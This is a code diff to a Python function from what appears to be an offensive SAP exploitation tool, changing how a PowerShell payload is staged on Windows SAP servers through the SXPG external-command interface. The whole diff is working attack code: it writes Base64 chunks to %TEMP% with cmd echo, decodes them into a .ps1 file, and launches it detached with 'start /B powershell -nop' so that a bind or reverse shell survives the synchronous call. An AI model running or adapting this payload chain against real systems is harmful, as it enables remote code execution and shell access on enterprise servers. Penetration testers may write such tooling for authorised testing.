@@ -439,31 +439,44 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     assert len(run_cmd_prog)   <= 128, f"Execute EXTPROG too long: {run_cmd_prog!r}"
     assert len(run_cmd_params) <= 255, f"Execute PARAMS too long: {len(run_cmd_params)}"
 
-    # SXPG path: write ASCII Base64 chunks, decode+exec via
-    # PowerShell -EncodedCommand (which encodes the DECODE script).
-    # SXPG splits PARAMS at spaces but -e <base64> is just 2 tokens.
-    # Also uses %TEMP%/$env:TEMP so the SAP user always has write access.
-    sxpg_tmp_cmd = r"%TEMP%\s"     # cmd.exe side
-    sxpg_tmp_ps  = r"$env:TEMP\s"  # PowerShell side
+    # SXPG path: write ASCII Base64 chunks to %TEMP%\s, decode to %TEMP%\s.ps1
+    # then launch via "cmd.exe /C start /B powershell.exe -nop -File %TEMP%\s.ps1".
+    #
+    # The critical difference from the GW path: SXPG_STEP_XPG_START is a
+    # *synchronous* RFC call — it blocks until the child process exits.
+    # A bind shell (or any long-lived reverse shell) would deadlock because:
+    #   - SXPG blocks on powershell.exe (waiting for AcceptTcpClient/session end)
+    #   - start_connector is only called AFTER execute_local_command returns
+    # Solution: launch PowerShell detached via "cmd.exe /C start /B ...".
+    # cmd.exe exits immediately after spawning powershell, SXPG returns,
+    # start_connector runs and connects to the waiting bind shell.
+    sxpg_tmp_cmd = r"%TEMP%\s"       # cmd.exe path — expanded by cmd.exe
+    sxpg_tmp_ps  = r"$env:TEMP\s"    # PowerShell path — expanded by PS
+    sxpg_ps1_ps  = r"$env:TEMP\s.ps1"  # decoded script file (PS path)
     enc_ascii = base64.b64encode(
         ps_script.encode("ascii")).decode("ascii")
     sxpg_chunks = [enc_ascii[i:i+chunk_size]
                    for i in range(0, len(enc_ascii), chunk_size)]
-    # Build the decode+exec script, then encode IT for -e.
-    # Double-quoted "$env:TEMP\sapmap_s" expands $env:TEMP at runtime.
-    decode_script = ('iex([Text.Encoding]::ASCII.GetString('
-                     '[Convert]::FromBase64String('
-                     f'-join(gc "{sxpg_tmp_ps}"))))')
-    decode_enc = base64.b64encode(
-        decode_script.encode("utf-16-le")).decode("ascii")
-    sxpg_params = f"-nop -e {decode_enc}"
-    assert len(sxpg_params) <= 255, (
-        f"SXPG params too long: {len(sxpg_params)}")
+    # Decode step: decode base64 from %TEMP%\s → write PS script to %TEMP%\s.ps1
+    # Paths use double-quoted PS strings so $env:TEMP expands at runtime.
+    # Inner \" are literal double-quotes via CommandLineToArgvW.
+    sxpg_decode_params = ("-nop -c \"[IO.File]::WriteAllText("
+                          "\\\"" + sxpg_ps1_ps + "\\\","
+                          "[Text.Encoding]::ASCII.GetString("
+                          "[Convert]::FromBase64String("
+                          "-join(gc \\\"" + sxpg_tmp_ps + "\\\"))))\"")
+    # Final execute step: launch .ps1 detached so cmd.exe (and SXPG) return
+    # immediately without waiting for the shell session to end.
+    sxpg_final_params = "/C start /B powershell.exe -nop -File %TEMP%\\s.ps1"
+    assert len(sxpg_decode_params) <= 255, (
+        f"SXPG decode params too long: {len(sxpg_decode_params)}")
+    assert len(sxpg_final_params)  <= 255, (
+        f"SXPG final params too long: {len(sxpg_final_params)}")
 
     sxpg_steps = [
-        # %TEMP% always exists — just clean the old file if present
+        # Clean up old intermediate and script files
         {"command": "cmd.exe",
-         "params": f"/C del /q {sxpg_tmp_cmd} 2>nul"},
+         "params": "/C del /q %TEMP%\\s %TEMP%\\s.ps1 2>nul"},
     ]
     for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
@@ -471,14 +484,17 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
             "command": "cmd.exe",
             "params": f"/C echo {chunk}{redir}{sxpg_tmp_cmd}",
         })
+    # Decode the base64 file into a .ps1 script file
+    sxpg_steps.append({"command": "powershell.exe",
+                        "params": sxpg_decode_params})
     return {
         "steps": steps,
         "command": run_cmd_prog,
         "params": run_cmd_params,
         "long_params": "",          # prevent PARAMS+LONG_PARAMS concat on old kernels
         "sxpg_steps": sxpg_steps,
-        "sxpg_command": "powershell.exe",
-        "sxpg_params": sxpg_params,
+        "sxpg_command": "cmd.exe",          # detached launch via start /B
+        "sxpg_params": sxpg_final_params,
         "display": display,
     }
 
